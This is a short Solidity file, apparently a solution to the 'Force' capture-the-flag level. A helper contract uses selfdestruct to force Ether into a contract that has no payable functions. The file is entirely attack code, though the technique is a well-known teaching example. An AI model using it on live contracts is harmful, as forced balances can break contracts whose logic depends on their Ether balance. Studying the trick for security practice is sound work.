// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
        MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}

contract ForceEther {
    // Constructor to receive Ether when deployed
    constructor() payable {}

    // Function to self-destruct and send Ether to the target contract
    function destroyAndSend(address payable _target) external {
        selfdestruct(_target);
    }
}